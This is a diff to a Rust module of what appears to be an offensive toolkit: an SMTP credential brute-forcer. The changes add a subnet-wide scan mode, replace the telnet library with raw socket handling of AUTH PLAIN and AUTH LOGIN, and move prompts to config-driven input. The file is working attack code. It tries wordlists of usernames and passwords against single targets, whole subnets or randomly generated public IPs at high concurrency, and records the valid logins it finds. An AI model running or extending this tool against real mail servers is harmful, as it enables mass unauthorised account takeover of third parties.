@@ -9,16 +9,16 @@ use std::sync::{
 use std::time::Duration;
 use tokio::sync::{Mutex, Semaphore};
 use futures::stream::{FuturesUnordered, StreamExt};
-use telnet::{Telnet, Event};
+use std::io::{BufRead, BufReader, Write};
 use base64::{engine::general_purpose, Engine as _};
 use tokio::io::AsyncWriteExt;
 use tokio::fs::OpenOptions;
 
 use crate::utils::{
-    prompt_yes_no, prompt_existing_file, prompt_int_range,
-    load_lines, prompt_default, prompt_wordlist,
+    load_lines,
+    cfg_prompt_yes_no, cfg_prompt_existing_file, cfg_prompt_int_range, cfg_prompt_output_file,
 };
-use crate::modules::creds::utils::{BruteforceStats, generate_random_public_ip, is_ip_checked, mark_ip_checked, parse_exclusions};
+use crate::modules::creds::utils::{BruteforceStats, generate_random_public_ip, is_ip_checked, mark_ip_checked, parse_exclusions, is_subnet_target, parse_subnet, subnet_host_count};
 
 const STATE_FILE: &str = "smtp_hose_state.log";
 const MASS_SCAN_CONNECT_TIMEOUT_MS: u64 = 3000;
@@ -65,19 +65,24 @@ pub async fn run(target: &str) -> Result<()> {
         return run_mass_scan(target).await;
     }
 
+    if is_subnet_target(target) {
+        println!("{}", format!("[*] Target: {} (Subnet Scan)", target).cyan());
+        return run_subnet_scan(target).await;
+    }
+
     // --- Standard Single Target Logic ---
     
-    let port = prompt_int_range("Port", 25, 1, 65535)? as u16;
-    let username_wordlist = prompt_existing_file("Username wordlist file")?;
-    let password_wordlist = prompt_existing_file("Password wordlist file")?;
+    let port = cfg_prompt_int_range("port", "Port", 25, 1, 65535)? as u16;
+    let username_wordlist = cfg_prompt_existing_file("username_wordlist", "Username wordlist file")?;
+    let password_wordlist = cfg_prompt_existing_file("password_wordlist", "Password wordlist file")?;
     
-    let threads = prompt_int_range("Threads", 8, 1, 256)? as usize;
-    let delay_ms = prompt_int_range("Delay (ms)", 50, 0, 10000)? as u64;
+    let threads = cfg_prompt_int_range("threads", "Threads", 8, 1, 256)? as usize;
+    let delay_ms = cfg_prompt_int_range("delay_ms", "Delay (ms)", 50, 0, 10000)? as u64;
     
-    let stop_on_success = prompt_yes_no("Stop on first valid login?", true)?;
-    let full_combo = prompt_yes_no("Try every username with every password?", false)?;
-    let verbose = prompt_yes_no("Verbose mode?", false)?;
-    let output_file = prompt_default("Output file for results", "smtp_results.txt")?;
+    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first valid login?", true)?;
+    let full_combo = cfg_prompt_yes_no("combo_mode", "Try every username with every password?", false)?;
+    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?;
+    let output_file = cfg_prompt_output_file("output_file", "Output file for results", "smtp_results.txt")?;
 
     let config = SmtpBruteforceConfig {
         target: target.to_string(),
@@ -98,9 +103,9 @@ pub async fn run(target: &str) -> Result<()> {
 
 async fn run_mass_scan(target: &str) -> Result<()> {
     // Prep
-    let port = prompt_int_range("Port", 25, 1, 65535)? as u16;
-    let usernames_file = prompt_wordlist("Username wordlist")?;
-    let passwords_file = prompt_wordlist("Password wordlist")?;
+    let port = cfg_prompt_int_range("port", "Port", 25, 1, 65535)? as u16;
+    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist")?;
+    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist")?;
     
     let users = load_lines(&usernames_file)?;
     let pass_lines = load_lines(&passwords_file)?;
@@ -108,9 +113,9 @@ async fn run_mass_scan(target: &str) -> Result<()> {
     if users.is_empty() { return Err(anyhow!("User list empty")); }
     if pass_lines.is_empty() { return Err(anyhow!("Pass list empty")); }
 
-    let concurrency = prompt_int_range("Max concurrent hosts to scan", 500, 1, 10000)? as usize;
-    let verbose = prompt_yes_no("Verbose mode?", false)?; 
-    let output_file = prompt_default("Output result file", "smtp_mass_results.txt")?;
+    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts to scan", 500, 1, 10000)? as usize;
+    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?; 
+    let output_file = cfg_prompt_output_file("output_file", "Output result file", "smtp_mass_results.txt")?;
 
     // Parse exclusions
     let exclusions = Arc::new(parse_exclusions(EXCLUDED_RANGES));
@@ -188,6 +193,64 @@ async fn run_mass_scan(target: &str) -> Result<()> {
         }
     }
     
+    Ok(())
+}
+
+async fn run_subnet_scan(target: &str) -> Result<()> {
+    let network = parse_subnet(target)?;
+    let count = subnet_host_count(&network);
+    println!("{}", format!("[*] Subnet {} — {} hosts to scan", target, count).cyan());
+
+    let port = cfg_prompt_int_range("port", "Port", 25, 1, 65535)? as u16;
+    let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist")?;
+    let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist")?;
+    let users = load_lines(&usernames_file)?;
+    let passes = load_lines(&passwords_file)?;
+    if users.is_empty() { return Err(anyhow!("User list empty")); }
+    if passes.is_empty() { return Err(anyhow!("Pass list empty")); }
+
+    let concurrency = cfg_prompt_int_range("concurrency", "Max concurrent hosts", 50, 1, 10000)? as usize;
+    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?;
+    let output_file = cfg_prompt_output_file("output_file", "Output result file", "smtp_subnet_results.txt")?;
+
+    let semaphore = Arc::new(Semaphore::new(concurrency));
+    let stats_checked = Arc::new(AtomicUsize::new(0));
+    let stats_found = Arc::new(AtomicUsize::new(0));
+    let creds_pkg = Arc::new((users, passes));
+    let total = count;
+
+    let s_checked = stats_checked.clone();
+    let s_found = stats_found.clone();
+    tokio::spawn(async move {
+        loop {
+            tokio::time::sleep(Duration::from_secs(5)).await;
+            println!("[*] Status: {}/{} IPs scanned, {} valid credentials found",
+                s_checked.load(Ordering::Relaxed), total,
+                s_found.load(Ordering::Relaxed).to_string().green().bold());
+        }
+    });
+
+    for ip in network.iter() {
+        let permit = semaphore.clone().acquire_owned().await.context("Semaphore")?;
+        let cp = creds_pkg.clone();
+        let sc = stats_checked.clone();
+        let sf = stats_found.clone();
+        let of = output_file.clone();
+
+        tokio::spawn(async move {
+            mass_scan_host(ip, port, cp, sf, of, verbose).await;
+            sc.fetch_add(1, Ordering::Relaxed);
+            drop(permit);
+        });
+    }
+
+    for _ in 0..concurrency {
+        let _ = semaphore.acquire().await.context("Semaphore")?;
+    }
+
+    println!("\n{}", format!("[*] Subnet scan complete. {} hosts scanned, {} credentials found.",
+        stats_checked.load(Ordering::Relaxed),
+        stats_found.load(Ordering::Relaxed)).cyan().bold());
     Ok(())
 }
 
@@ -278,7 +341,7 @@ async fn run_smtp_bruteforce(config: SmtpBruteforceConfig) -> Result<()> {
     let stats = Arc::new(BruteforceStats::new());
     let found_creds = Arc::new(Mutex::new(Vec::new()));
     let stop_signal = Arc::new(AtomicBool::new(false));
-    let _start_time = std::time::Instant::now();
+    let start_time = std::time::Instant::now();
 
     // Start progress reporter
     let stats_clone = stats.clone();
@@ -383,6 +446,8 @@ async fn run_smtp_bruteforce(config: SmtpBruteforceConfig) -> Result<()> {
     stop_signal.store(true, Ordering::Relaxed);
     let _ = progress_handle.await;
     
+    let elapsed = start_time.elapsed();
+    println!("[*] Elapsed: {:.1}s", elapsed.as_secs_f64());
     stats.print_final().await;
     
     // Save results
@@ -400,95 +465,99 @@ async fn run_smtp_bruteforce(config: SmtpBruteforceConfig) -> Result<()> {
     Ok(())
 }
 
+/// Read a single SMTP response line (terminated by \n).
+/// Returns the trimmed line or an error on timeout / EOF.
+fn read_smtp_line(reader: &mut BufReader<&TcpStream>) -> Result<String> {
+    let mut line = String::new();
+    let n = reader.read_line(&mut line).context("SMTP read")?;
+    if n == 0 {
+        return Err(anyhow!("Connection closed"));
+    }
+    Ok(line.trim_end().to_string())
+}
+
 fn try_smtp_login(target: &str, port: u16, username: &str, password: &str) -> Result<bool> {
     let addr = format!("{}:{}", target, port);
     let socket = addr.to_socket_addrs()?.next().ok_or_else(|| anyhow!("Resolution failed"))?;
     let stream = TcpStream::connect_timeout(&socket, Duration::from_millis(2000))?;
     stream.set_read_timeout(Some(Duration::from_millis(2000)))?;
     stream.set_write_timeout(Some(Duration::from_millis(2000)))?;
-    
-    let mut telnet = Telnet::from_stream(Box::new(stream), 512);
-    
-    let mut banner_ok = false;
-    for _ in 0..3 {
-        let event = telnet.read().context("Banner read")?;
-        if let Event::Data(b) = event {
-            let s = String::from_utf8_lossy(&b);
-            if s.starts_with("220") { banner_ok = true; break; }
-        }
+
+    let mut reader = BufReader::new(&stream);
+    // We write via a reference to the same stream (TcpStream is duplex)
+    let mut writer = &stream;
+
+    // Read banner — expect 220
+    let banner = read_smtp_line(&mut reader).context("Banner read")?;
+    if !banner.starts_with("220") {
+        return Err(anyhow!("No 220 banner"));
     }
-    if !banner_ok { return Err(anyhow!("No 220 banner")); }
-    
-    telnet.write(b"EHLO scanner\r\n")?;
-    
+
+    // Send EHLO
+    writer.write_all(b"EHLO scanner\r\n")?;
+    writer.flush()?;
+
     let mut login_ok = false;
     let mut plain_ok = false;
     let mut ehlo_seen = false;
-    
-    for _ in 0..6 {
-        let event = telnet.read().context("EHLO read")?;
-        if let Event::Data(b) = event {
-            let s = String::from_utf8_lossy(&b);
-            if s.contains("AUTH") && s.contains("PLAIN") { plain_ok = true; }
-            if s.contains("AUTH") && s.contains("LOGIN") { login_ok = true; }
-            if s.starts_with("250 ") { ehlo_seen = true; break; }
-        }
+
+    // Read multi-line EHLO response (250-... continues, 250 ... ends)
+    for _ in 0..10 {
+        let line = read_smtp_line(&mut reader).context("EHLO read")?;
+        if line.contains("AUTH") && line.contains("PLAIN") { plain_ok = true; }
+        if line.contains("AUTH") && line.contains("LOGIN") { login_ok = true; }
+        // "250 " (with space) is the final line of the EHLO response
+        if line.starts_with("250 ") { ehlo_seen = true; break; }
+        // If the line doesn't start with 250 at all, something is wrong
+        if !line.starts_with("250") { break; }
     }
     if !ehlo_seen { return Ok(false); }
 
     // Try AUTH PLAIN
     if plain_ok {
-        let mut blob = vec![0];
+        let mut blob = vec![0u8];
         blob.extend(username.as_bytes()); blob.push(0); blob.extend(password.as_bytes());
         let cmd = format!("AUTH PLAIN {}\r\n", general_purpose::STANDARD.encode(&blob));
-        telnet.write(cmd.as_bytes())?;
-        
-        for _ in 0..2 {
-             let event = telnet.read().context("Auth response")?;
-             if let Event::Data(b) = event {
-                 let s = String::from_utf8_lossy(&b);
-                 if s.starts_with("235") { telnet.write(b"QUIT\r\n").ok(); return Ok(true); }
-                 if s.starts_with("535") || s.starts_with("5") { return Ok(false); }
-             }
+        writer.write_all(cmd.as_bytes())?;
+        writer.flush()?;
+
+        let resp = read_smtp_line(&mut reader).context("Auth response")?;
+        if resp.starts_with("235") {
+            let _ = writer.write_all(b"QUIT\r\n");
+            return Ok(true);
         }
+        if resp.starts_with("5") { return Ok(false); }
     }
-    
+
     // Try AUTH LOGIN
     if login_ok {
-        telnet.write(b"AUTH LOGIN\r\n")?;
-        
+        writer.write_all(b"AUTH LOGIN\r\n")?;
+        writer.flush()?;
+
         // Wait for username prompt (334)
-        for _ in 0..2 {
-             let event = telnet.read().context("Auth Login prompt")?;
-             if let Event::Data(b) = event {
-                 if String::from_utf8_lossy(&b).starts_with("334") { break; }
-             }
-        }
-        
+        let prompt1 = read_smtp_line(&mut reader).context("Auth Login prompt")?;
+        if !prompt1.starts_with("334") { return Ok(false); }
+
         let ucmd = format!("{}\r\n", general_purpose::STANDARD.encode(username.as_bytes()));
-        telnet.write(ucmd.as_bytes())?;
-        
+        writer.write_all(ucmd.as_bytes())?;
+        writer.flush()?;
+
         // Wait for password prompt (334)
-         for _ in 0..2 {
-             let event = telnet.read().context("Auth Pass prompt")?;
-             if let Event::Data(b) = event {
-                 if String::from_utf8_lossy(&b).starts_with("334") { break; }
-             }
-        }
-        
+        let prompt2 = read_smtp_line(&mut reader).context("Auth Pass prompt")?;
+        if !prompt2.starts_with("334") { return Ok(false); }
+
         let pcmd = format!("{}\r\n", general_purpose::STANDARD.encode(password.as_bytes()));
-        telnet.write(pcmd.as_bytes())?;
-        
-        for _ in 0..2 {
-            let event = telnet.read().context("Auth final response")?;
-            if let Event::Data(b) = event {
-                let s = String::from_utf8_lossy(&b);
-                 if s.starts_with("235") { telnet.write(b"QUIT\r\n").ok(); return Ok(true); }
-                 if s.starts_with("535") || s.starts_with("5") { return Ok(false); }
-            }
+        writer.write_all(pcmd.as_bytes())?;
+        writer.flush()?;
+
+        let resp = read_smtp_line(&mut reader).context("Auth final response")?;
+        if resp.starts_with("235") {
+            let _ = writer.write_all(b"QUIT\r\n");
+            return Ok(true);
         }
+        if resp.starts_with("5") { return Ok(false); }
     }
-    
+
     Ok(false)
 }
 
